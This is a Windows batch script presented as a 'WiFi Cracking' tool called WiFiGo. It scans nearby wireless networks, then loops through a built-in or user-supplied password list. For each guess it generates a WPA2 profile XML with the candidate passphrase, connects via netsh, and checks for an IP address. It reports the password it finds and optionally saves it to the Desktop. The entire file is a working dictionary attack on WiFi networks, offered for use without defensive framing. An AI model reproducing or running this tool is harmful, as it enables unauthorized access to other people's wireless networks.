@echo off
:: Welcome screen and Software usage
:Welcom
    cls
    echo ##################################################################
    echo ###                                                            ###
    echo ###  ##         ##  ##  #######  ##       ########    ######   ###
    echo ###  ##         ##  ##  ##       ##      ##      ##  ##    ##  ###
    echo ###  ##         ##  ##  ######   ##      ##          ##    ##  ###
    echo ###  ##  ## ##  ##  ##  ##       ##      ##    ####  ##    ##  ###
    echo ###   ####   ####   ##  ##       ##      ##      ##  ##    ##  ###
    echo ###    ##     ##    ##  ##       ##  ##   ########    ######   ###
    echo ###                                                            ###
    echo ###                      Auther, Siddiq Jr                     ###
    echo ###                Windows WiFi Cracking, V 1.0.0              ###
    echo ###                         2022 - 2023                        ###
    echo ##################################################################
    
    echo Description :
    echo.
    echo   A Tool Built on Batch Script to BroutFource Wifi Network, works
    echo   On command  line  interface  only, no addetional files or space
    echo   Needed,  and  final  output  will  be  printed  on console only
    echo.
    echo   To Start Select From The options Below :
    echo.
    echo     [S] Scan Available Networks
    echo     [Q] Quit
    echo.

:: Setting User Input and Checking Validity Then Goto Choice:
:User
    setlocal
    set /p Choice=Type "S" To Scan OR "Q" To Quit :
    :: Checking Choice Validity:
    :Check_quit
    if "%Choice%"=="q" (
          goto :End
    ) else (
        goto :Check_quit_Upper
    )
    :Check_quit_Upper 
    if "%Choice%"=="Q" ( 
            goto :End
    ) else (
       goto :Check_Scan
    )
    :Check_Scan
    if "%Choice%"=="s" (
          goto :Scan_Networks
    ) else (
        goto :Check_quit_Upper
    )
    :Check_quit_Upper 
    if "%Choice%"=="S" ( 
            goto :Scan_Networks
    ) else (
       echo.
       echo -----------------------------------------
       echo Please Select From Options Only { S / Q }
       echo -----------------------------------------
       echo.
       goto :User
    )
    endlocal

:: Scanning Available Networks
:Scan_Networks
    setlocal
    cls
    echo ##################################################################
    echo ###                                                            ###
    echo ###                      Scanning Done !                       ###
    echo ###                                                            ###
    echo ##################################################################
    echo.
    echo           ! Copy and Paste The Selected Network Name !
    echo.
        netsh wlan show networks | find /c "SSID" > cou.tmp
        set /p n=<cou.tmp
        if "%n%"=="0" (
           del cou.tmp
           goto :Brake
        ) else (
        echo Networks Available :
        echo.
             FOR /F "Tokens=2 delims=:" %%i in ('netsh wlan show networks ^| find "SSID"') do (
                 echo Name = %%i
             ) 
        )
    echo.
    echo *****************************************************************
    echo.
    echo           ! Copy and Paste The Selected Network Name !
    echo.
    echo.
    echo -----------------------------------------------------------------
    echo To Copy  : Hilight The Name and " Ctr + C ".
    echo To Paste : Click Right Mouse Butten "Options Btn".
    echo -----------------------------------------------------------------
    echo.
       goto :Create_Profile
    :Brake
       cls
    echo ##################################################################
    echo ###                                                            ###
    echo ###      No Network In Range, OR Adapter is Powered Down       ###
    echo ###                                                            ###
    echo ##################################################################
    echo.
    echo.
    echo.
    echo.
    echo         Check Your Wireless Network Adapter and Try Again
    echo       If It Didin't Work,  No Wireless Network are in Range
       goto :End
    endlocal

:: Creating Profile For The selected Network 
:Create_Profile
    :: str2hex Function To convert the name to hex to be used in Profile Settings
    :str2hex
       goto :Setup
       :Convert
          setlocal EnableDelayedExpansion
             set /P "=%~1" < NUL > chr.tmp
             for %%a in (chr.tmp) do fsutil file createnew zero.tmp %%~Za > NUL
             set hex=
             for /F "skip=1 tokens=2" %%a in ('fc /B chr.tmp zero.tmp') do set "hex=!hex!%%a"
             del chr.tmp zero.tmp
             endlocal & set "%~1=%hex%" & SET "hex=%hex%"
             goto :eof
      
       :Setup
             echo.
             echo.
             set /p SNN=Paste Here :
             call :Convert "%SNN%"

:: Requirements bulding the needed directories
:Requirements
    mkdir WifiGo
    mkdir WifiGo\TMP
    mkdir WifiGo\TMP\SUB

:: Profile Settings Function Just Display The Settings For The user
:: And Offer to select a Built in Wordlist Or Custom List
:Profile_Settings
    cls
    echo ##################################################################
    echo ###                                                            ###
    echo ###           Your Selected Network profile Settings           ###
    echo ###                                                            ###
    echo ##################################################################
    echo.
    echo      Network Name : %SNN%
    echo.     Hex Value    : %hex%
    echo.
    echo.                Profile Initilization is done !
    echo.
    echo  Do You Want To use The Built In Dectionary, OR To use your own ?
    echo.
    echo      [1] Built in Dectionary.
    echo      [2] Custom Dectionary.
    echo      [Q] Abort.
    echo.
    echo.
    :User_3
        setlocal
           set /p choice_2=Type " 1 or 2 " To Select OR " Q " To Abort :
        :Check_Choice_2
           :case_1_2
              if "%choice_2%"=="1" (
                 goto :Built_In_List
              ) else (
                 goto :case_2_2
              )
           :case_2_2
              if "%choice_2%"=="2" (
                 goto :Custom_List
              ) else (
                 goto :case_3_2
              )
           :case_3_2
              if "%choice_2%"=="q" (
              goto :End
              ) else (
                  goto :Check_quit_Upper
              )
              :Check_quit_Upper 
              if "%choice_2%"=="Q" ( 
                  goto :End
              ) else (
                  echo.
                  echo ----------------------------------------------
                  echo Please Select From The Provided Options Only !
                  echo ----------------------------------------------
                  echo.
                  goto :User_3
              )
         endlocal

:: Built in List This Script just To Generate a temp File of a Wordlist in the Temp Folder 
:: And FeedBack a path, and Using That to in the Broutforce Function 
:Built_In_List
    setlocal
       for /d %%i in (11111111,22222222,33333333,44444444,55555555,66666666,Zerokool,77777777,88888888,99999999,00000000,12345678,87654321,1234567890,0987654321,123456789,987654321,qqqqqqqq,wwwwwwww,eeeeeeee,rrrrrrrr,tttttttt,yyyyyyyy,uuuuuuuu,iiiiiiii,oooooooo,pppppppp,aaaaaaaa,ssssssss,dddddddd,ffffffff,gggggggg,hhhhhhhh,jjjjjjjj,kkkkkkkk,llllllll,zzzzzzzz,xxxxxxxx,cccccccc,vvvvvvvv,bbbbbbbb,nnnnnnnn,mmmmmmmm,Qqqqqqqq,Wwwwwwww,Eeeeeeee,Rrrrrrrr,Tttttttt,Yyyyyyyy,Uuuuuuuu,Iiiiiiii,Oooooooo,Pppppppp,Aaaaaaaa,Ssssssss,Dddddddd,Ffffffff,Gggggggg,Hhhhhhhh,Jjjjjjjj,Kkkkkkkk,Llllllll,Zzzzzzzz,Xxxxxxxx,Cccccccc,Vvvvvvvv,Bbbbbbbb,Nnnnnnnn,Mmmmmmmm,1111111111,2222222222,3333333333,4444444444,5555555555,6666666666,7777777777,8888888888,9999999999,0000000000,111111111,222222222,333333333,444444444,555555555,666666666,777777777,888888888,999999999,000000000,0917964004,095513388,12121212,23232323,34343434,45454545,56565656,67676767,78787878,89898989,10101010,09090909,98989898,87878787,76767676,65656565,54545454,43434343,32323232,21212121,1212121212,2323232323,3434343434,4545454545,5656565656,6767676767,7878787878,8989898989,9090909090,1010101010,0909090909,9898989898,8787878787,7676767676,6565656565,5454545454,4343434343,3232323232,2121212121,sabryglaxy,AndroidAP,Galaxy_A02D66F,Galaxy-A02D66F,GalaxyA02D66F,galaxya02D66f,Galaxya02D66f,Password,Pa$$word,Pa$w0rd,Pa$$w0rd,Pa$$W0rd,PA$$W0RD,My_Password,My_P@$$w0rd,my-password,mypassword,password) do (
           echo %%i >> WifiGo\TMP\wordlist.tmp
       )
       cls
       echo ##################################################################
       echo ###                                                            ###
       echo ###                   BuiltIn Dictinary Mode                   ###
       echo ###                                                            ###
       echo ##################################################################
       echo.
       echo.
       echo.
       echo          Built-In WordList Is Generated Succesfully !
       echo.
       set wordlist=WifiGo\TMP\wordlist.tmp
       goto :main
    endlocal

:: Custom List This Script Uses a User Provided List 
:Custom_List
    setlocal
    rem welcom screen for user provided list
    cls
    echo ##################################################################
    echo ###                                                            ###
    echo ###                   Custom Dictinary Mode                    ###
    echo ###                                                            ###
    echo ##################################################################
    echo.
    echo.     
    echo.
    echo.
    echo        Please Locate Your Dictinary And Paste The Path Below
    echo.
    echo        Ex.  "C:\Users\UserProfile\Desktop\Wordlist.txt"
    echo.
    echo.
    echo.
    echo Paste The Path Within double Quotes [ " " ]
    echo.
    goto :User_Path_Input
    rem user path input, check for the validity of the user provided list
    :User_Path_Input
            set /p UserPath=Paste Here :
       cls
       echo ##################################################################
       echo ###                                                            ###
       echo ###                   Custom Dictinary Mode                    ###
       echo ###                                                            ###
       echo ##################################################################
       echo.
       echo.     
       echo.
       echo.
       echo                Checking Validity, Please Wait ...

          goto :Check_If_Quit
     rem check if quit an other abort if statment to quit from this point 
    :Check_If_Quit 
       if "%UserPath%"=="q" (
             goto :End
       ) else (
           goto :Check_quit_Upper
       )
       :Check_quit_Upper 
       if "%UserPath%"=="Q" ( 
               goto :End
       ) else (
          goto :User_Dec_Check
       )
    rem the part whech user path input function checks for validity
    :User_Dec_Check
       type %UserPath% | find /v /c "~" >count.tmp
       set /p cnt=<count.tmp
       del count.tmp
       if "%cnt%"=="0" (
             cls
             echo ##################################################################
             echo ###                                                            ###
             echo ###                   Custom Dictinary Mode                    ###
             echo ###                                                            ###
             echo ##################################################################
             echo.
             echo.     
             echo.
             echo.
             echo                        Checking Complete
             echo.
             echo                !! The Path Spesified is invalid !!
             echo.
             echo                Please Check The Path And Try Again
             echo.
             echo                     Or Type " Q / q " To Quit
             echo.
             goto :User_Path_Input
       ) else (
             cls
             echo ##################################################################
             echo ###                                                            ###
             echo ###                   Custom Dictinary Mode                    ###
             echo ###                                                            ###
             echo ##################################################################
             echo.
             echo.     
             echo.
             echo.
             echo                        Checking Complete
             echo.
             echo                        Cout :    %cnt%    
             echo.
             echo                 Initilizing Dectiunary Attack ...
             echo.
                   timeout /t 3 /nobreak >nul
             copy %UserPath% WifiGo\TMP\wordlist.tmp >nul
             timeout /t 2 /nobreak >nul
             set wordlist=WifiGo\TMP\wordlist.tmp
             goto :main
       )
    endlocal  
:: Main cracking Function where The actiual cracking happens
:main
    set SNN2="%SNN%"
    rem This is the main Cracking Function  or the main loop it handel generating a profile template
    rem and loop throw  the word  list and when it finds the correct word it will stop and print the 
    rem correct password for the network.

       rem This is the template fill loop, use network name and hex value and  one word at the time
    :loop
        for /f %%i in (%wordlist%) do (
        rem This is the Profile Template To Use  :Starts Here:
        echo ^<?xml version="1.0"?^>> WiFi-%SNN2%.xml
        echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>>> WiFi-%SNN2%.xml
        echo 	 ^<name^>%SNN%^</name^>>> WiFi-%SNN2%.xml
        echo 	 ^<SSIDConfig^>>> WiFi-%SNN2%.xml
        echo 		 ^<SSID^>>> WiFi-%SNN2%.xml
        echo 			 ^<hex^>%hex%^</hex^>>> WiFi-%SNN2%.xml            
        echo 			 ^<name^>%SNN%^</name^>>> WiFi-%SNN2%.xml    
        echo 		 ^</SSID^>>> WiFi-%SNN2%.xml         
        echo 	 ^</SSIDConfig^>>> WiFi-%SNN2%.xml      
        echo 	 ^<connectionType^>ESS^</connectionType^>>> WiFi-%SNN2%.xml          
        echo 	 ^<connectionMode^>auto^</connectionMode^>>> WiFi-%SNN2%.xml
        echo 	 ^<MSM^>>> WiFi-%SNN2%.xml
        echo 		 ^<security^>>> WiFi-%SNN2%.xml
        echo 			 ^<authEncryption^>>> WiFi-%SNN2%.xml
        echo 				 ^<authentication^>WPA2PSK^</authentication^>>> WiFi-%SNN2%.xml
        echo 				 ^<encryption^>AES^</encryption^>>> WiFi-%SNN2%.xml
        echo 				 ^<useOneX^>false^</useOneX^>>> WiFi-%SNN2%.xml
        echo 			 ^</authEncryption^>>> WiFi-%SNN2%.xml
        echo 			 ^<sharedKey^>>> WiFi-%SNN2%.xml
        echo 				 ^<keyType^>passPhrase^</keyType^>>> WiFi-%SNN2%.xml
        echo 				 ^<protected^>false^</protected^>>> WiFi-%SNN2%.xml
        echo 				 ^<keyMaterial^>%%i^</keyMaterial^>>> WiFi-%SNN2%.xml
        echo 			 ^</sharedKey^>>> WiFi-%SNN2%.xml
        echo 		 ^</security^>>> WiFi-%SNN2%.xml
        echo 	 ^</MSM^>>> WiFi-%SNN2%.xml
        echo 	 ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>>> WiFi-%SNN2%.xml
        echo 		 ^<enableRandomization^>false^</enableRandomization^>>> WiFi-%SNN2%.xml
        echo  	 ^</MacRandomization^>>> WiFi-%SNN2%.xml
        echo ^</WLANProfile^>>> WiFi-%SNN2%.xml
        rem This is the Profile Template To Use  :Ends Here:
    
        rem This Will Add The Profile And Connect To It 
              netsh wlan add profile filename=WiFi-%SNN2%.xml interface="WiFi" >nul
              del WiFi-%SNN2%.xml >nul
              netsh wlan connect SSID=%SNN2% name=%SNN2% >nul
              timeout /t 2 >nul
    
        rem This will Test Every Word To Internet Connection And Stop If Found The Correct One It Will
        rem Also Stop If Not Correct Word Found 
              cls      
              echo ##################################################################
              echo ###                                                            ###
              echo ###                       WiFiGo, V 1.0.0                      ###
              echo ###                         By Siddiq Jr                       ###
              echo ###                                                            ###
              echo ###                Wifi Network Word Spaying Mode              ###
              echo ###                                                            ###
              echo ###                         2022 - 2023                        ###
              echo ###                                                            ###
              echo ##################################################################
              echo.
              echo.
              echo                    Network Name    : %SNN%
              echo.
              echo                    Testing Word    : %%i
              echo.
              set pass=%%i
              more +1 WifiGo\TMP\wordlist.tmp > WifiGo\TMP\SUB\wordlist.tmp
              del WifiGo\TMP\wordlist.tmp >nul
              move WifiGo\TMP\SUB\wordlist.tmp WifiGo\TMP\wordlist.tmp >nul
              goto :Condetion
            )
    rem Condetion Function handel the check for match from the template filling loop after init connection
    :condetion
    rem condetion looking for the most rare charector used in passwords "~" to count the wodlist 
       type WifiGo\TMP\wordlist.tmp | find /v /c "~" >WifiGo\TMP\count.tmp
       set /p cnt=<WifiGo\TMP\count.tmp
       echo                    Remaining Words : %cnt%
       echo.
       del WifiGo\TMP\count.tmp
       rem This if Statment checks if the wordlist has words or empty "1"=Empty
       if "%cnt%"=="1" (
          echo No Match Found !!
         goto :eof
       ) else (
          goto :Statment
       )
       rem Statment function Actualy check for real ip address existance to determin if
       rem The connection was successful, and breakout of the main loop if it is
       :Statment
          ipconfig /showclassid WiFi | find "There are no DHCPv4 classes defined for WiFi."> WifiGo\TMP\Condetion.tmp
          set /p condetion=<WifiGo\TMP\Condetion.tmp
          if "%condetion%"=="There are no DHCPv4 classes defined for WiFi." (
             cls
             echo ##################################################################
             echo ###                                                            ###
             echo ###                       WiFiGo, V 1.0.0                      ###
             echo ###                         By Siddiq Jr                       ###
             echo ###                                                            ###
             echo ###                Wifi Network Word Spaying Mode              ###
             echo ###                                                            ###
             echo ###                         2022 - 2023                        ###
             echo ###                                                            ###
             echo ##################################################################
             echo.
             echo.
             echo                *********************************
             echo               ^|   Done ! Found The Password  ^|
             echo                *********************************
             echo.
             echo                    Network Name : %SNN%
             echo.
             echo                    Password     : %pass%
             echo.
             echo                *********************************
             echo.
             echo.
             echo.
             goto :Success
          ) else (
             netsh wlan disconnect
             netsh wlan delete profile name=%SNN2% i=* >nul
             goto :loop
          )
    rem this function just to terminate the script but in the main script will contain the final screen
    :Success
    Set /p Save2txt=Do You Want To Save it To File (Y/N) ?
       :Save2txt_check_Yes
          if "%Save2txt%"=="y" (
                goto :Save2txtFunc
          ) else (
              goto :Check_Save_Upper_Yes
          )
          :Check_Save_Upper_Yes 
          if "%Save2txt%"=="Y" ( 
                  goto :Save2txtFunc
          ) else (
             goto :Save2txt_check_No
          )
       :Save2txt_check_No
          if "%Save2txt%"=="n" (
                   goto :Cleaning
             ) else (
                 goto :Check_Save_Upper_No
             )
             :Check_Save_Upper_No 
             if "%Save2txt%"=="N" ( 
                     goto :Cleaning
             ) else (
                echo.
                echo Invalid Input, Please Type [Y/N] Only !
                goto :Success
             )
      :Cleaning
          rmdir /s /q WifiGo
      endlocal
       goto :Ending

:: save to text function just prints its output to a textfile on Desktop
:Save2txtFunc
    echo ################################################################## > %USERPROFILE%\Desktop\%SNN%.txt
    echo ###                                                            ### >> %USERPROFILE%\Desktop\%SNN%.txt
    echo ###                       WiFiGo, V 1.0.0                      ### >> %USERPROFILE%\Desktop\%SNN%.txt
    echo ###                         By Siddiq Jr                       ### >> %USERPROFILE%\Desktop\%SNN%.txt
    echo ###                         2022 - 2023                        ### >> %USERPROFILE%\Desktop\%SNN%.txt
    echo ###                                                            ### >> %USERPROFILE%\Desktop\%SNN%.txt
    echo ################################################################## >> %USERPROFILE%\Desktop\%SNN%.txt
    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
    echo                    Network Name : %SNN%                            >> %USERPROFILE%\Desktop\%SNN%.txt
    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
    echo                    Password     : %pass%                           >> %USERPROFILE%\Desktop\%SNN%.txt
    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
    echo.                                                                   >> %USERPROFILE%\Desktop\%SNN%.txt
    echo ****************************************************************** >> %USERPROFILE%\Desktop\%SNN%.txt
    goto:Cleaning

:: Ending Function, Shows the crached password for the last time 
:Ending
    cls
    echo ##################################################################
    echo ###                                                            ###
    echo ###                       WiFiGo, V 1.0.0                      ###
    echo ###                         By Siddiq Jr                       ###
    echo ###                                                            ###
    echo ###                Wifi Network Word Spaying Mode              ###
    echo ###                                                            ###
    echo ###                         2022 - 2023                        ###
    echo ###                                                            ###
    echo ##################################################################
    echo.
    echo.
    echo                *********************************
    echo               ^|   Done ! Found The Password  ^|
    echo                *********************************
    echo.
    echo                    Network Name : %SNN%
    echo.
    echo                    Password     : %pass%
    echo.
    echo                *********************************
    echo.
    echo                  Thank You For Using My Tool
    echo.
    echo                           Bay Bay !
    goto :eof
:: End Function is the goodbay screen 
:End
    cls
    echo ##################################################################
    echo ###                                                            ###
    echo ###  ##         ##  ##  #######  ##       ########    ######   ###
    echo ###  ##         ##  ##  ##       ##      ##      ##  ##    ##  ###
    echo ###  ##         ##  ##  ######   ##      ##          ##    ##  ###
    echo ###  ##  ## ##  ##  ##  ##       ##      ##    ####  ##    ##  ###
    echo ###   ####   ####   ##  ##       ##      ##      ##  ##    ##  ###
    echo ###    ##     ##    ##  ##       ##  ##   ########    ######   ###
    echo ###                                                            ###
    echo ###                      Auther, Siddiq Jr                     ###
    echo ###                Windows WiFi Cracking, V 1.0.0              ###
    echo ###                         2022 - 2023                        ###
    echo ##################################################################
    echo.
    echo            Any Saved Files Will Be On Your Desktop
    echo.
    echo                  Thank You For Using My Tool
    echo.
    echo                     Hop You Enjoied It 
    echo.
    echo                           Bay !
    echo.
    echo.
    echo                 Press Any Key To Exit...
    timeout /t 300 >nul
    goto :eof